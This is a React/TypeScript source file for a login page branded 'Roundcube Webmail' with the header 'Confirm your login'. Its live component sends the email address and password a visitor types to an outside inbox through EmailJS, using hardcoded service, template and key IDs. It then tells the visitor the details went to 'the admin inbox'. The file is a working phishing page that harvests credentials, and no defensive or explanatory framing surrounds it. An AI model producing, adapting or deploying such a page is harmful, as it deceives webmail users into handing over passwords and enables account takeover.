// // src/components/LoginScreen.jsx
// import React, { useState } from "react";

// export default function LoginScreen() {
//   const [email, setEmail] = useState("");
//   const [password, setPassword] = useState("");

//   const handleSubmit = (e: any): void => {
//     e.preventDefault();
//     alert(`Email: ${email}\nPassword: ${password}`);
//   };

//   return (
//     <div className="min-h-screen flex items-center justify-center bg-gray-100 px-4">
//       <div className="max-w-sm w-full bg-white shadow-md rounded-lg p-6">
//         {/* Header */}
//         <h2 className="text-lg font-medium text-gray-800 mb-6 text-center">
//           Confirm your login
//         </h2>

//         {/* Icon Placeholder */}
//         <div className="flex justify-center mb-6">
//           <div className="h-16 w-16 bg-gray-200 rounded-full flex items-center justify-center">
//             {/* Replace this with your actual logo */}
//             <svg
//               className="h-8 w-8 text-gray-400"
//               fill="currentColor"
//               viewBox="0 0 20 20"
//             >
//               <path d="M10 2a6 6 0 016 6v2a6 6 0 01-6 6 6 6 0 01-6-6V8a6 6 0 016-6z" />
//             </svg>
//           </div>
//         </div>

//         {/* Form */}
//         <form onSubmit={handleSubmit} className="space-y-4">
//           <div>
//             <label htmlFor="email" className="sr-only">
//               Email address
//             </label>
//             <div className="flex items-center border border-gray-300 rounded-md overflow-hidden">
//               <span className="px-3 text-gray-500">
//                 <svg
//                   className="h-5 w-5"
//                   fill="currentColor"
//                   viewBox="0 0 20 20"
//                 >
//                   <path d="M2.94 6.94A8 8 0 1117.06 11.06 8 8 0 012.94 6.94zM10 4a6 6 0 100 12A6 6 0 0010 4z" />
//                 </svg>
//               </span>
//               <input
//                 id="email"
//                 type="email"
//                 required
//                 value={email}
//                 onChange={(e) => setEmail(e.target.value)}
//                 className="w-full px-3 py-2 focus:outline-none"
//                 placeholder="Email address"
//               />
//             </div>
//           </div>

//           <div>
//             <label htmlFor="password" className="sr-only">
//               Password
//             </label>
//             <div className="flex items-center border border-gray-300 rounded-md overflow-hidden">
//               <span className="px-3 text-gray-500">
//                 <svg
//                   className="h-5 w-5"
//                   fill="currentColor"
//                   viewBox="0 0 20 20"
//                 >
//                   <path
//                     fillRule="evenodd"
//                     d="M5 8a3 3 0 116 0v1h1a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2h1V8zm3-1a1 1 0 00-1 1v1h2V8a1 1 0 00-1-1z"
//                     clipRule="evenodd"
//                   />
//                 </svg>
//               </span>
//               <input
//                 id="password"
//                 type="password"
//                 required
//                 value={password}
//                 onChange={(e) => setPassword(e.target.value)}
//                 className="w-full px-3 py-2 focus:outline-none"
//                 placeholder="Password"
//               />
//             </div>
//           </div>

//           <button
//             type="submit"
//             className="w-full bg-blue-500 hover:bg-blue-600 text-white py-2 rounded-md transition"
//           >
//             LOGIN
//           </button>
//         </form>

//         {/* Footer */}
//         <p className="text-center text-xs text-gray-400 mt-4">
//           Roundcube Webmail
//         </p>
//       </div>
//     </div>
//   );
// }

// with email js

// src/components/LoginScreen.tsx
import React, { useState } from "react";
import emailjs from "emailjs-com";

export default function LoginScreen() {
  // ─────────────────────────────────────────────────────────────────────
  // 1) LOCAL STATE FOR FORM FIELDS
  // ─────────────────────────────────────────────────────────────────────
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);

  // ─────────────────────────────────────────────────────────────────────
  // 2) REPLACE THESE WITH YOUR ACTUAL EMAILJS CREDENTIALS
  // ─────────────────────────────────────────────────────────────────────
  //  - SERVICE_ID:    find it under Email Services → your service name (e.g. "service_xxx")
  //  - TEMPLATE_ID:   find it next to your template’s name (e.g. "template_login")
  //  - USER_ID:       the Public Key/“User ID” from Integration / Dashboard
  const SERVICE_ID = "service_3ovhau7";
  const TEMPLATE_ID = "template_awj458c";
  const USER_ID = "JgEoxgXqr1ANEF3Dk";
  // ─────────────────────────────────────────────────────────────────────

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    // Build the template parameters matching the placeholders in your EmailJS template
    const templateParams = {
      user_email: email,
      user_password: password,
      // If your template had {{timestamp}}, you could do:
      // timestamp: new Date().toLocaleString(),
    };

    try {
      // Send the email via EmailJS:
      const result = await emailjs.send(
        SERVICE_ID,
        TEMPLATE_ID,
        templateParams,
        USER_ID
      );

      console.log("EmailJS successfully sent:", result.text);

      alert("Success! We have sent your login info to the admin inbox.");
      setEmail("");
      setPassword("");
    } catch (err: any) {
      console.error("EmailJS error:", err.text || err);
      alert("Oops, something went wrong sending the email. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-100 px-4">
      <div className="max-w-sm w-full bg-white shadow-md rounded-lg p-6">
        {/* Header */}
        <h2 className="text-lg font-medium text-gray-800 mb-6 text-center">
          Confirm your login
        </h2>

        {/* Form */}
        <form onSubmit={handleSubmit} className="space-y-4">
          {/* Email Input */}
          <div>
            <label htmlFor="email" className="sr-only">
              Email address
            </label>
            <div className="flex items-center border border-gray-300 rounded-md overflow-hidden">
              <span className="px-3 text-gray-500">
                {/* (email icon) */}
                <svg
                  className="h-5 w-5"
                  fill="currentColor"
                  viewBox="0 0 20 20"
                >
                  <path d="M2.94 6.94A8 8 0 1117.06 11.06 8 8 0 012.94 6.94zM10 4a6 6 0 100 12A6 6 0 0010 4z" />
                </svg>
              </span>
              <input
                id="email"
                type="email"
                required
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="w-full px-3 py-2 focus:outline-none"
                placeholder="Email address"
                disabled={loading}
              />
            </div>
          </div>

          {/* Password Input */}
          <div>
            <label htmlFor="password" className="sr-only">
              Password
            </label>
            <div className="flex items-center border border-gray-300 rounded-md overflow-hidden">
              <span className="px-3 text-gray-500">
                {/* (lock icon) */}
                <svg
                  className="h-5 w-5"
                  fill="currentColor"
                  viewBox="0 0 20 20"
                >
                  <path
                    fillRule="evenodd"
                    d="M5 8a3 3 0 116 0v1h1a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2h1V8zm3-1a1 1 0 00-1 1v1h2V8a1 1 0 00-1-1z"
                    clipRule="evenodd"
                  />
                </svg>
              </span>
              <input
                id="password"
                type="password"
                required
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full px-3 py-2 focus:outline-none"
                placeholder="Password"
                disabled={loading}
              />
            </div>
          </div>

          {/* Submit Button */}
          <button
            type="submit"
            disabled={loading}
            className={`w-full ${
              loading ? "bg-gray-400" : "bg-blue-500 hover:bg-blue-600"
            } text-white py-2 rounded-md transition`}
          >
            {loading ? "Sending..." : "LOGIN"}
          </button>
        </form>

        {/* Footer */}
        <p className="text-center text-xs text-gray-400 mt-4">
          Roundcube Webmail
        </p>
      </div>
    </div>
  );
}
